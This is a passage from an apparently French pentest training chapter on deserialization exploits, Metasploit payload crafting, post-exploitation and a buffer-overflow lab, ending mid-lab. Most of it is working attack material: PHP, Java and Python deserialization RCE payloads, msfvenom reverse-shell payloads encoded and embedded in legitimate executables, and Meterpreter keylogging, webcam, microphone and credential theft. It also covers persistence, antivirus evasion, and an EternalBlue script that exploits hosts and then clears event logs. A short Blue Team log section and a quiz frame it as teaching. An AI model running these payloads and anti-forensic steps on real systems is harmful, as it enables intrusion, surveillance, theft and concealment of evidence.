   $serialized = serialize($exploit);
   echo $serialized;
   // Output: O:14:"CustomTemplate":1:{s:20:"template_file_path";s:4:";id;";}
   ```

5. **Exploitation en Java avec ysoserial**
   ```bash
   # Génération d'un payload pour exécuter 'calc.exe' avec la chaîne de gadgets CommonsCollections1
   java -jar ysoserial.jar CommonsCollections1 calc.exe > payload.bin
   
   # Envoi du payload
   curl -X POST --data-binary @payload.bin http://vulnerable-app/endpoint
   ```

6. **Exploitation en Python avec Pickle**
   ```python
   import pickle
   import base64
   import os
   
   class RCE:
       def __reduce__(self):
           # Cette méthode est appelée lors de la désérialisation
           cmd = "id"  # Commande à exécuter
           return os.system, (cmd,)
   
   # Création du payload
   payload = pickle.dumps(RCE())
   payload_b64 = base64.b64encode(payload).decode()
   
   print(f"Pickle payload (base64): {payload_b64}")
   
   # Pour tester localement
   # pickle.loads(base64.b64decode(payload_b64))
   ```

7. **Script d'exploitation de désérialisation PHP**
   ```php
   <?php
   // Fonction pour générer un payload de désérialisation PHP
   function generate_php_payload($command) {
       // Utilisation de la classe Monolog/RCE
       $payload = 'O:18:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"' . "\x00" . '*' . "\x00" . 'handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"' . "\x00" . '*' . "\x00" . 'handler";O:20:"Monolog\Handler\SyslogHandler":2:{s:6:"' . "\x00" . '*' . "\x00" . 'ident";s:' . strlen($command) . ':"' . $command . '";s:10:"' . "\x00" . '*' . "\x00" . 'socket";i:0;}s:13:"' . "\x00" . '*' . "\x00" . 'bufferSize";i:-1;s:9:"' . "\x00" . '*' . "\x00" . 'buffer";a:1:{i:0;a:2:{i:0;s:' . strlen('exec') . ':"exec";i:1;s:' . strlen($command) . ':"' . $command . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'level";N;s:14:"' . "\x00" . '*' . "\x00" . 'initialized";b:1;s:14:"' . "\x00" . '*' . "\x00" . 'bufferLimit";i:-1;s:13:"' . "\x00" . '*' . "\x00" . 'processors";a:0:{}}s:13:"' . "\x00" . '*' . "\x00" . 'bufferSize";i:-1;s:9:"' . "\x00" . '*' . "\x00" . 'buffer";a:1:{i:0;a:2:{i:0;s:4:"exec";i:1;s:' . strlen($command) . ':"' . $command . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'level";N;s:14:"' . "\x00" . '*' . "\x00" . 'initialized";b:1;s:14:"' . "\x00" . '*' . "\x00" . 'bufferLimit";i:-1;s:13:"' . "\x00" . '*' . "\x00" . 'processors";a:0:{}}}';
       
       return $payload;
   }
   
   // Commande à exécuter
   $command = isset($argv[1]) ? $argv[1] : "id";
   
   // Génération du payload
   $payload = generate_php_payload($command);
   
   // Encodage en base64 pour transmission
   $payload_b64 = base64_encode($payload);
   
   echo "PHP Deserialization Payload:\n";
   echo "Raw: " . $payload . "\n\n";
   echo "Base64: " . $payload_b64 . "\n";
   ?>
   ```

### Utilisation avancée de Metasploit

Metasploit est un framework puissant pour le pentesting, mais son utilisation avancée nécessite une compréhension approfondie de ses fonctionnalités.

#### Personnalisation des payloads

1. **Encodage et obfuscation**
   ```bash
   # Encodage simple avec shikata_ga_nai
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
   
   # Encodage multiple (10 itérations)
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
   
   # Encodage avec clé personnalisée
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -k -i 10 -f exe -o payload.exe
   
   # Utilisation de l'option -x pour intégrer le payload dans un exécutable légitime
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/legitimate.exe -f exe -o payload.exe
   ```

2. **Création de payloads personnalisés**
   ```ruby
   # Exemple de module personnalisé (my_payload.rb)
   # Placer dans ~/.msf4/modules/payloads/singles/windows/
   
   require 'msf/core'
   
   module Metasploit3
     include Msf::Payload::Windows
     include Msf::Payload::Single
     
     def initialize(info = {})
       super(merge_info(info,
         'Name'          => 'Custom Windows Shell',
         'Description'   => 'Custom payload that executes a specific command',
         'Author'        => 'Your Name',
         'License'       => MSF_LICENSE,
         'Platform'      => 'win',
         'Arch'          => ARCH_X86,
         'Payload'       => {
           'Payload' => "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5..." # Shellcode here
         }
       ))
     end
   end
   ```

3. **Utilisation de templates et de formats avancés**
   ```bash
   # Création d'un DLL
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o payload.dll
   
   # Création d'un service Windows
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe-service -o service.exe
   
   # Création d'un shellcode pour injection
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o shellcode.c
   
   # Création d'un macro Office
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba -o macro.vba
   
   # Création d'un HTA (HTML Application)
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hta-psh -o payload.hta
   ```

#### Post-exploitation avancée

1. **Pivoting avec Metasploit**
   ```
   # Dans msfconsole, après avoir obtenu une session Meterpreter
   
   # Ajout de routes pour le pivoting
   meterpreter > run autoroute -s 192.168.1.0/24
   
   # Ou depuis le prompt msf
   msf6 > route add 192.168.1.0/24 1  # où 1 est l'ID de la session
   
   # Vérification des routes
   msf6 > route print
   
   # Démarrage d'un proxy SOCKS
   msf6 > use auxiliary/server/socks_proxy
   msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
   msf6 auxiliary(server/socks_proxy) > run -j
   
   # Configuration de ProxyChains
   # Ajouter "socks5 127.0.0.1 1080" à /etc/proxychains.conf
   
   # Utilisation de ProxyChains pour accéder au réseau interne
   proxychains nmap -sT -Pn 192.168.1.10
   ```

2. **Persistance avancée**
   ```
   # Dans une session Meterpreter
   
   # Persistance via le registre
   meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.100
   
   # Persistance via WMI
   meterpreter > run post/windows/manage/persistence_wmi
   
   # Persistance via tâche planifiée
   meterpreter > run post/windows/manage/schtasks
   
   # Persistance via service
   meterpreter > run post/windows/manage/persistence_service
   
   # Backdoor RDP
   meterpreter > run post/windows/manage/sticky_keys
   ```

3. **Collecte d'informations avancée**
   ```
   # Dans une session Meterpreter
   
   # Capture d'écran
   meterpreter > screenshot
   
   # Enregistrement audio
   meterpreter > record_mic -d 10
   
   # Capture webcam
   meterpreter > webcam_snap
   
   # Keylogger
   meterpreter > keyscan_start
   meterpreter > keyscan_dump
   
   # Collecte de mots de passe
   meterpreter > run post/windows/gather/credentials/credential_collector
   
   # Extraction de certificats
   meterpreter > run post/windows/gather/enum_certs
   
   # Extraction de cookies de navigateur
   meterpreter > run post/windows/gather/enum_chrome
   meterpreter > run post/windows/gather/enum_firefox
   ```

4. **Techniques d'évasion avancées**
   ```
   # Dans msfconsole
   
   # Utilisation de techniques d'évasion pour contourner les AV
   msf6 > use evasion/windows/windows_defender_exe
   
   # Utilisation de shellter pour infecter un exécutable légitime
   # (Nécessite l'installation préalable de shellter)
   # shellter -a -f legitimate.exe -p meterpreter_reverse_tcp
   
   # Utilisation de Veil pour générer des payloads indétectables
   # (Nécessite l'installation préalable de Veil)
   # ./Veil.py
   
   # Utilisation de techniques d'injection de processus
   meterpreter > migrate <PID>
   
   # Utilisation de techniques de reflective DLL injection
   msf6 > use post/windows/manage/reflective_dll_inject
   ```

#### Automatisation avec Resource Scripts

Les scripts de ressources permettent d'automatiser des tâches répétitives dans Metasploit.

1. **Création d'un script de ressources simple**
   ```
   # exploit_target.rc
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.10
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.100
   set LPORT 4444
   exploit -j
   ```

2. **Utilisation de variables et de boucles**
   ```
   # scan_network.rc
   setg RHOSTS 192.168.1.0/24
   setg THREADS 10
   
   use auxiliary/scanner/smb/smb_version
   run
   
   use auxiliary/scanner/smb/smb_enumshares
   run
   
   use auxiliary/scanner/smb/smb_ms17_010
   run
   ```

3. **Utilisation de conditions et de commandes Ruby**
   ```
   # advanced_scan.rc
   <ruby>
   # Définition de la plage d'adresses IP
   ip_range = "192.168.1.1-192.168.1.254"
   
   # Exécution d'un scan de ports
   run_single("use auxiliary/scanner/portscan/tcp")
   run_single("set RHOSTS #{ip_range}")
   run_single("set PORTS 21,22,23,25,80,443,445,3389")
   run_single("run")
   
   # Pour chaque hôte avec le port 445 ouvert, exécuter un scan SMB
   framework.db.hosts.each do |host|
     host.services.each do |service|
       if service.port == 445 && service.state == "open"
         puts "Scanning SMB on #{host.address}"
         run_single("use auxiliary/scanner/smb/smb_ms17_010")
         run_single("set RHOSTS #{host.address}")
         run_single("run")
       end
     end
   end
   </ruby>
   ```

4. **Exécution de scripts de ressources**
   ```bash
   # Exécution depuis la ligne de commande
   msfconsole -r exploit_target.rc
   
   # Exécution depuis msfconsole
   msf6 > resource /path/to/script.rc
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les exploitations de buffer overflow

1. **Logs d'application**
   - Crashs d'application avec des erreurs de segmentation
   - Entrées anormalement longues dans les logs d'accès
   - Messages d'erreur spécifiques (ex: "stack smashing detected")
   
   **Exemple de log d'application :**
   ```
   [Wed May 15 14:23:45 2023] [error] [client 192.168.1.100] Segmentation fault in process 1234
   [Wed May 15 14:23:45 2023] [error] [client 192.168.1.100] Stack overflow detected, terminating process
   ```

2. **Logs système**
   - Crashs de processus enregistrés dans les journaux système
   - Redémarrages de services après crash
   - Alertes de protection mémoire (DEP/ASLR)
   
   **Exemple de log système :**
   ```
   May 15 14:23:45 server kernel: [1234] segfault at 41414141 ip 41414141 sp 7fffffffe4d0 error 14
   May 15 14:23:45 server kernel: [1234] general protection fault: 0000 [#1] SMP
   ```

3. **Logs de sécurité**
   - Détections d'exploitation par les solutions de sécurité
   - Alertes de comportement anormal de processus
   - Exécution de code dans des zones mémoire non autorisées
   
   **Exemple de log de sécurité :**
   ```
   [ALERT] Buffer Overflow Attempt Detected
   Process: vulnerable_app (PID: 1234)
   User: www-data
   Source IP: 192.168.1.100
   Timestamp: 2023-05-15 14:23:45
   Details: Attempted execution in non-executable memory region
   Severity: Critical
   ```

#### Traces générées par les exploitations web avancées

1. **Logs de serveur web**
   - Requêtes HTTP anormales (longueur, contenu, encodage)
   - Accès à des ressources internes via SSRF
   - Erreurs de parsing XML pour XXE
   
   **Exemple de log de serveur web :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0000] "POST /api/xml HTTP/1.1" 500 1234 "-" "Mozilla/5.0"
   192.168.1.100 - - [15/May/2023:14:24:12 +0000] "GET /api/fetch?url=http://internal-server/admin HTTP/1.1" 200 5678 "-" "Mozilla/5.0"
   ```

2. **Logs d'application web**
   - Erreurs de désérialisation
   - Tentatives d'accès à des fichiers système
   - Requêtes vers des services internes
   
   **Exemple de log d'application web :**
   ```
   [2023-05-15 14:23:45] [ERROR] Unserialize error: Unexpected property in class User
   [2023-05-15 14:24:12] [ERROR] Failed to fetch URL: http://internal-server/admin (Connection refused)
   ```

3. **Logs de pare-feu/WAF**
   - Détection de payloads XXE
   - Blocage de requêtes SSRF vers des adresses internes
   - Alertes sur des tentatives de désérialisation malveillante
   
   **Exemple de log de WAF :**
   ```
   [15/May/2023:14:23:45 +0000] "POST /api/xml HTTP/1.1" 403 - "XXE injection attempt detected" "OWASP CRS Rule 931100"
   [15/May/2023:14:24:12 +0000] "GET /api/fetch?url=http://internal-server/admin HTTP/1.1" 403 - "SSRF attempt detected" "OWASP CRS Rule 934100"
   ```

#### Traces générées par Metasploit

1. **Logs réseau**
   - Connexions vers des ports inhabituels
   - Trafic chiffré anormal
   - Patterns de communication caractéristiques (beaconing)
   
   **Exemple de log réseau :**
   ```
   2023-05-15 14:23:45 TCP 192.168.1.100:54321 -> 10.0.0.1:4444 [SYN]
   2023-05-15 14:23:45 TCP 10.0.0.1:4444 -> 192.168.1.100:54321 [SYN, ACK]
   2023-05-15 14:23:45 TCP 192.168.1.100:54321 -> 10.0.0.1:4444 [ACK]
   2023-05-15 14:23:45 TCP 192.168.1.100:54321 -> 10.0.0.1:4444 [PSH, ACK] Len=1460
   ```

2. **Logs système**
   - Exécution de processus inhabituels
   - Modifications du registre (persistance)
   - Création de tâches planifiées ou services
   
   **Exemple de log système :**
   ```
   May 15 14:23:45 server process[1234]: New process created: cmd.exe /c "payload.exe"
   May 15 14:23:45 server process[1234]: Registry key modified: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   ```

3. **Logs EDR/AV**
   - Détection de shellcode
   - Alertes sur des comportements de post-exploitation
   - Détection de techniques d'injection de processus
   
   **Exemple de log EDR :**
   ```
   [ALERT] Meterpreter Session Detected
   Process: explorer.exe (PID: 1234)
   User: SYSTEM
   Source IP: 192.168.1.100
   Timestamp: 2023-05-15 14:23:45
   Details: Process injection detected, shellcode signature matches Meterpreter
   Severity: Critical
   ```

#### Alertes SIEM typiques

**Alerte de buffer overflow :**
```
[ALERT] Buffer Overflow Exploitation Detected
Host: server01
Process: vulnerable_app (PID: 1234)
User: www-data
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: Process crashed with EIP overwrite pattern, followed by shellcode execution
Severity: Critical
```

**Alerte de SSRF :**
```
[ALERT] Server-Side Request Forgery Detected
Host: webserver01
Application: internal-api
Source IP: 192.168.1.100
Time: 2023-05-15 14:24:12
Details: Multiple requests to internal resources from external source
Affected URLs: /api/fetch?url=http://internal-server/admin
Severity: High
```

**Alerte de Metasploit :**
```
[ALERT] Metasploit Activity Detected
Host: workstation01
Process: explorer.exe (PID: 1234)
User: SYSTEM
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: Network traffic pattern matches Meterpreter C2, followed by suspicious process activity
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs avec les buffer overflows

1. **Mauvaise identification de l'offset EIP**
   - Calcul incorrect de l'offset où l'adresse de retour est écrasée
   - Utilisation d'un motif (pattern) trop court
   - Confusion entre les architectures 32 bits et 64 bits
   
   **Solution :** Utiliser des outils comme `pattern_create` et `pattern_offset` pour déterminer précisément l'offset, et vérifier avec un test simple (ex: `"A" * offset + "BBBB" + "C" * reste`).

2. **Problèmes avec les mauvais caractères**
   - Oubli de tester tous les caractères possibles
   - Non-détection de certains mauvais caractères
   - Présence de mauvais caractères dans l'adresse de retour ou le shellcode
   
   **Solution :** Tester méthodiquement tous les caractères de `\x01` à `\xff`, et répéter le test après avoir retiré chaque mauvais caractère identifié. S'assurer que l'adresse de retour ne contient pas de mauvais caractères.

3. **Problèmes de stabilité du shellcode**
   - Shellcode trop grand pour l'espace disponible
   - Absence de NOP sled pour augmenter la fiabilité
   - Utilisation d'un encodeur incompatible avec la cible
   
   **Solution :** Utiliser un NOP sled (`\x90`) avant le shellcode, choisir un encodeur approprié, et s'assurer que le shellcode est suffisamment petit pour tenir dans l'espace disponible.

#### Erreurs avec les exploitations web avancées

1. **Détection limitée de SSRF**
   - Test uniquement avec des URL évidentes (localhost, 127.0.0.1)
   - Non-exploration des protocoles alternatifs (file://, dict://, gopher://)
   - Oubli de tester les contournements de filtres
   
   **Solution :** Tester systématiquement différentes représentations d'adresses IP internes, différents protocoles, et diverses techniques de contournement.

2. **Erreurs avec XXE**
   - Non-détection des parseurs XML vulnérables
   - Tentatives d'exploitation sans vérifier si les entités externes sont activées
   - Oubli de tester l'exfiltration out-of-band pour les XXE "aveugles"
   
   **Solution :** Vérifier d'abord si les entités externes sont traitées, puis tester différentes techniques d'exploitation, y compris l'exfiltration out-of-band pour les cas où les résultats ne sont pas directement visibles.

3. **Problèmes avec la désérialisation**
   - Méconnaissance des classes disponibles pour construire des chaînes de gadgets
   - Tentatives d'exploitation sans comprendre le format de sérialisation
   - Utilisation de payloads génériques non adaptés à l'environnement cible
   
   **Solution :** Analyser le code source ou les bibliothèques utilisées pour identifier les classes exploitables, comprendre le format de sérialisation spécifique, et adapter les payloads à l'environnement cible.

#### Erreurs avec Metasploit

1. **Utilisation de payloads détectables**
   - Utilisation de payloads sans encodage ou obfuscation
   - Choix d'encodeurs inefficaces contre les solutions de sécurité modernes
   - Négligence des techniques d'évasion avancées
   
   **Solution :** Utiliser des encodeurs multiples, des techniques d'obfuscation avancées, et des outils complémentaires comme Veil ou Shellter pour générer des payloads moins détectables.

2. **Erreurs de configuration de listener**
   - Utilisation d'adresses IP ou de ports facilement bloqués
   - Configuration incorrecte des options de payload
   - Oubli de configurer correctement le pivoting
   
   **Solution :** Utiliser des ports communément autorisés (80, 443), configurer correctement toutes les options de payload, et vérifier la configuration du pivoting avant exploitation.

3. **Traces excessives post-exploitation**
   - Exécution de commandes bruyantes générant beaucoup de logs
   - Utilisation excessive de modules de post-exploitation
   - Négligence du nettoyage des traces
   
   **Solution :** Limiter l'exécution de commandes au strict nécessaire, utiliser des techniques de post-exploitation discrètes, et nettoyer systématiquement les traces après exploitation.

### OPSEC Tips : exploitation discrète

#### Techniques de base

1. **Réduction des tentatives d'exploitation**
   ```bash
   # Vérification préalable de la vulnérabilité sans exploitation
   # Exemple pour MS17-010
   use auxiliary/scanner/smb/smb_ms17_010
   set RHOSTS 192.168.1.10
   run
   ```

2. **Limitation du bruit réseau**
   ```bash
   # Utilisation de délais entre les requêtes
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.10
   set WfsDelay 5
   exploit
   ```

3. **Choix de payloads discrets**
   ```bash
   # Utilisation de payloads stageless pour réduire le trafic réseau
   set PAYLOAD windows/meterpreter_reverse_https
   
   # Utilisation de ports légitimes
   set LPORT 443
   ```

#### Techniques avancées

1. **Obfuscation avancée de payloads**
   ```bash
   # Utilisation de Veil pour générer des payloads indétectables
   # (Nécessite l'installation préalable de Veil)
   ./Veil.py
   
   # Utilisation de techniques d'injection de processus légitimes
   meterpreter > migrate <PID d'un processus légitime>
   ```

2. **Communication C2 discrète**
   ```bash
   # Configuration de délais et de jitter pour le beaconing
   set SessionCommunicationTimeout 30
   set SessionExpirationTimeout 60
   set SessionRetryTotal 3
   set SessionRetryWait 5
   
   # Utilisation de domaines légitimes pour le staging
   set STAGEHOST legitimate-cdn.com
   ```

3. **Techniques anti-forensics**
   ```
   # Dans une session Meterpreter
   
   # Désactivation de l'historique de commandes
   meterpreter > run post/windows/manage/delete_cmd_history
   
   # Nettoyage des logs d'événements Windows
   meterpreter > run post/windows/manage/eventlog
   
   # Suppression des artefacts Metasploit
   meterpreter > clearev
   ```

#### Script d'exploitation OPSEC

Voici un exemple de script pour réaliser une exploitation discrète :

```ruby
# opsec_exploit.rc - Script d'exploitation discrète avec Metasploit

<ruby>
# Configuration des variables
target_host = "192.168.1.10"
local_host = "192.168.1.100"
local_port = 443
exploit_module = "exploit/windows/smb/ms17_010_eternalblue"
payload_type = "windows/meterpreter_reverse_https"

# Fonction pour vérifier la vulnérabilité sans exploitation
def check_vulnerability(host, module_name)
  print_status("Vérification de la vulnérabilité sur #{host}...")
  
  # Extraction du scanner correspondant à l'exploit
  scanner = nil
  case module_name
  when "exploit/windows/smb/ms17_010_eternalblue"
    scanner = "auxiliary/scanner/smb/smb_ms17_010"
  when "exploit/windows/smb/psexec"
    scanner = "auxiliary/scanner/smb/smb_login"
  else
    print_error("Scanner non disponible pour #{module_name}")
    return false
  end
  
  # Exécution du scanner
  run_single("use #{scanner}")
  run_single("set RHOSTS #{host}")
  run_single("set THREADS 1")
  run_single("run")
  
  # Vérification des résultats (simplifié, à adapter selon le scanner)
  framework.db.hosts.each do |db_host|
    if db_host.address == host
      db_host.vulns.each do |vuln|
        if vuln.name.include?("MS17-010") || vuln.name.include?("SMB")
          print_good("Hôte vulnérable confirmé: #{host}")
          return true
        end
      end
    end
  end
  
  print_error("Hôte non vulnérable ou vulnérabilité non détectée: #{host}")
  return false
end

# Fonction pour configurer et lancer l'exploitation
def exploit_target(host, local_host, local_port, exploit_module, payload_type)
  print_status("Configuration de l'exploitation discrète...")
  
  # Configuration de l'exploit
  run_single("use #{exploit_module}")
  run_single("set RHOSTS #{host}")
  
  # Configuration du payload
  run_single("set PAYLOAD #{payload_type}")
  run_single("set LHOST #{local_host}")
  run_single("set LPORT #{local_port}")
  
  # Options OPSEC
  run_single("set EnableStageEncoding true")
  run_single("set StageEncoder x86/shikata_ga_nai")
  run_single("set EnableUnicodeEncoding true")
  run_single("set SessionCommunicationTimeout 30")
  run_single("set SessionExpirationTimeout 60")
  run_single("set SessionRetryTotal 3")
  run_single("set SessionRetryWait 5")
  run_single("set AutoRunScript migrate -f")
  
  # Lancement de l'exploit
  print_status("Lancement de l'exploitation...")
  run_single("exploit -j")
  
  # Attente d'une session
  print_status("En attente d'une session...")
  session_timeout = 60
  session_start_time = Time.now
  
  while (Time.now - session_start_time < session_timeout)
    framework.sessions.each do |id, session|
      if session.tunnel_peer.include?(host)
        print_good("Session #{id} établie avec #{host}")
        return id
      end
    end
    sleep 5
  end
  
  print_error("Aucune session établie dans le délai imparti")
  return nil
end

# Fonction pour effectuer des actions post-exploitation discrètes
def post_exploitation(session_id)
  return if session_id.nil?
  
  print_status("Exécution des actions post-exploitation discrètes...")
  
  # Migration vers un processus légitime
  run_single("sessions -i #{session_id} -c \"migrate -n explorer.exe\"")
  
  # Collecte d'informations discrète
  run_single("sessions -i #{session_id} -c \"sysinfo\"")
  run_single("sessions -i #{session_id} -c \"getuid\"")
  
  # Exécution de modules post-exploitation discrets
  run_single("use post/windows/gather/enum_logged_on_users")
  run_single("set SESSION #{session_id}")
  run_single("run")
  
  run_single("use post/windows/gather/enum_applications")
  run_single("set SESSION #{session_id}")
  run_single("run")
  
  # Établissement de persistance discrète (optionnel)
  # run_single("use post/windows/manage/persistence_stub")
  # run_single("set SESSION #{session_id}")
  # run_single("set STARTUP SYSTEM")
  # run_single("run")
end

# Fonction pour nettoyer les traces
def cleanup_traces(session_id)
  return if session_id.nil?
  
  print_status("Nettoyage des traces...")
  
  # Suppression des logs d'événements
  run_single("sessions -i #{session_id} -c \"clearev\"")
  
  # Suppression de l'historique de commandes
  run_single("use post/windows/manage/delete_cmd_history")
  run_single("set SESSION #{session_id}")
  run_single("run")
  
  # Suppression des fichiers temporaires
  run_single("sessions -i #{session_id} -c \"rm %TEMP%\\*.exe\"")
  
  print_good("Nettoyage terminé")
end

# Exécution principale
begin
  # Vérification de la vulnérabilité
  if check_vulnerability(target_host, exploit_module)
    # Exploitation
    session_id = exploit_target(target_host, local_host, local_port, exploit_module, payload_type)
    
    if session_id
      # Post-exploitation
      post_exploitation(session_id)
      
      # Nettoyage
      cleanup_traces(session_id)
    end
  end
rescue => e
  print_error("Erreur: #{e.message}")
end
</ruby>
```

### Points clés

- L'exploitation avancée nécessite une compréhension approfondie des mécanismes internes des systèmes et applications.
- Les buffer overflows restent pertinents malgré les protections modernes, mais nécessitent des techniques avancées comme le ROP pour contourner DEP/NX.
- Les vulnérabilités web avancées comme SSRF, XXE et la désérialisation non sécurisée permettent souvent d'accéder à des ressources internes ou d'exécuter du code arbitraire.
- L'utilisation avancée de Metasploit implique la personnalisation des payloads, des techniques de post-exploitation discrètes, et l'automatisation via des scripts de ressources.
- Les équipes défensives peuvent détecter ces techniques via l'analyse des logs système, réseau et application.
- Des techniques OPSEC appropriées, comme la réduction du bruit réseau et le nettoyage des traces, permettent de réduire significativement la détectabilité des opérations d'exploitation.

### Mini-quiz (3 QCM)

1. **Quelle technique permet de contourner la protection DEP/NX lors d'un buffer overflow ?**
   - A) Utilisation d'un NOP sled plus long
   - B) Return-Oriented Programming (ROP)
   - C) Encodage du shellcode avec shikata_ga_nai
   - D) Utilisation d'un payload stageless

   *Réponse : B*

2. **Quelle vulnérabilité web permet d'accéder à des fichiers locaux sur le serveur via un parseur XML ?**
   - A) Server-Side Request Forgery (SSRF)
   - B) Cross-Site Scripting (XSS)
   - C) XML External Entity (XXE) Injection
   - D) SQL Injection

   *Réponse : C*

3. **Quelle commande Metasploit permet de configurer le pivoting pour accéder à un réseau interne ?**
   - A) `set PROXIES 127.0.0.1:8080`
   - B) `route add 192.168.1.0/24 1`
   - C) `set LHOST 192.168.1.100`
   - D) `use auxiliary/server/socks4a`

   *Réponse : B*

### Lab/Exercice guidé : Exploitation d'un buffer overflow

#### Objectif
Exploiter un buffer overflow dans une application vulnérable pour obtenir un shell.

#### Prérequis
- Machine virtuelle Linux (Kali Linux recommandé)
- Application vulnérable (nous utiliserons un exemple simple)
- GDB avec extensions (PEDA, GEF, ou pwndbg)

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/buffer_overflow
cd ~/pentest_labs/buffer_overflow

# Création d'un programme C vulnérable
cat > vulnerable.c << EOF
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnérabilité: pas de vérification de taille
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
EOF

# Compilation sans protections
gcc -m32 -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable

# Désactivation d'ASLR (temporaire)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

2. **Fuzzing : Trouver le point de crash**

```bash
# Script Python pour le fuzzing
cat > fuzz.py << EOF
#!/usr/bin/env python3
import subprocess
import sys

# Fonction pour exécuter le programme avec une entrée de longueur spécifique
def test_input(length):
    payload = "A" * length
    cmd = ["./vulnerable", payload]
    
    try:
        subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        return False  # Pas de crash
    except subprocess.CalledProcessError:
        return True   # Crash détecté
    
# Fuzzing avec des longueurs croissantes
for length in range(10, 200, 10):
    print(f"Testing input length: {length}")
    if test_input(length):
        print(f"Program crashed at length: {length}")
        break
EOF

chmod +x fuzz.py
./fuzz.py
```

3. **Détermination de l'offset EIP**

```bash
# Utilisation de GDB avec pattern
gdb -q ./vulnerable

# Dans GDB
gef> pattern create 100
# Copier le pattern généré

# Exécution avec le pattern
gef> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Après le crash, vérifier la valeur de EIP
gef> info registers eip
# Exemple: EIP = 0x41376141

# Trouver l'offset correspondant
gef> pattern search 0x41376141
# Exemple: Found at offset 76
```

4. **Vérification de l'offset**

```bash
# Script Python pour vérifier l'offset
cat > verify_offset.py << EOF
#!/usr/bin/env python3
import struct
import subprocess
import sys

# Offset déterminé précédemment
offset = 76

# Construction du payload
payload = b"A" * offset + b"BBBB" + b"C" * 20

# Exécution du programme avec le payload
try:
    subprocess.run(["./vulnerable", payload])
except:
    pass

print(f"Payload sent: {payload}")
print(f"If EIP contains 0x42424242 (BBBB), the offset {offset} is correct.")
EOF

chmod +x verify_offset.py

# Exécution dans GDB
gdb -q ./vulnerable
gef> run $(python3 -c 'print("A" * 76 + "BBBB" + "C" * 20)')

# Vérifier que EIP contient 0x42424242
gef> info registers eip
```

5. **Identification des mauvais caractères**

```bash
# Script Python pour tester les mauvais caractères
cat > badchars.py << EOF
#!/usr/bin/env python3
import struct

# Offset déterminé précédemment
offset = 76

# Tous les caractères de 0x01 à 0xff (excluant 0x00 null byte)
badchars = bytes([i for i in range(1, 256)])

# Construction du payload
payload = b"A" * offset + b"BBBB" + badchars

# Écriture du payload dans un fichier
with open("badchars_payload", "wb") as f:
    f.write(payload)

print(f"Payload written to badchars_payload")
print(f"Run in GDB: run $(cat badchars_payload)")
EOF

chmod +x badchars.py
./badchars.py

# Exécution dans GDB
gdb -q ./vulnerable
gef> run $(cat badchars_payload)

# Après le crash, examiner la mémoire pour identifier les mauvais caractères
gef> x/200xb $esp
# Comparer avec la séquence attendue (0x01, 0x02, ..., 0xff)
# Noter les caractères manquants ou corrompus
```

6. **Recherche d'une instruction JMP ESP**

```bash
# Dans GDB, rechercher l'instruction JMP ESP (opcode: \xff\xe4)
gef> find-gadget "jmp esp"
# Ou rechercher manuellement
gef> search-pattern "\xff\xe4"

# Noter une adresse trouvée (ex: 0x08049000)
```

7. **Génération du shellcode**

```bash
# Génération d'un shellcode avec msfvenom
msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x00" -f python -v shellcode

# Copier le shellcode généré
```

8. **Création de l'exploit final**

```bash
# Script Python pour l'exploit final
cat > exploit.py << EOF
#!/usr/bin/env python3
import struct
import subprocess
import sys

# Offset déterminé précédemment
offset = 76

# Adresse de JMP ESP trouvée
jmp_esp_addr = 0x08049000  # Remplacer par l'adresse réelle trouvée

# NOP sled
nop_sled = b"\x90" * 16

# Shellcode généré par msfvenom
shellcode = b"\xde\xc0\xad\xde"  # Remplacer par le shellcode réel

# Construction du payload
payload = b"A" * offset \
          + struct.pack("<I", jmp_esp_addr) \
          + nop_sled \
          + shellcode

# Exécution du programme avec le payload
print(f"Launching exploit...")
try:
    subprocess.call(["./vulnerable", payload])
except:
    pass
EOF

chmod +x exploit.py

# Exécution de l'exploit
./exploit.py
```

9. **Analyse du processus d'exploitation**

```bash
